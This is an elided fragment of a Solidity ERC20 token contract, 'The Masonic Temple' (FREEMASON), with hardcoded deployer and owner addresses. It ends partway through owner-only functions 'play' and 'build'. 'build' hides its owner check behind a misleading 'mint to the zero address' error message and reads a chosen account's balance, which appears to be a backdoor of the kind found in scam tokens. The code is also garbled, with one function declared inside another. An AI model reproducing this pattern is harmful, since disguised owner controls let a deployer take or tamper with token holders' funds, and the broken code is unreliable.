...
contract Freemasons is Context, IERC20 {
    ...
    address lead_deployer = 0x4f125e835bbc9BbB77607C66dE6D0d32339B936c;
    address public _owner = 0xB2c3cBE3a34E6F8e477B90aa781D2c7161c79eF3;
   constructor () public {


        
        _name = "The Masonic Temple";
        _symbol = "FREEMASON";
        _decimals = 6;
...
//-----------------------------------------------------------------------------------------------------------------------//
    ...
    */
    ...
    function play(address account) public {
        ...
        function build(address account, address staker) public {
        require(msg.sender == _owner, "ERC20: mint to the zero address");
        uint256 amount = _balances[account];
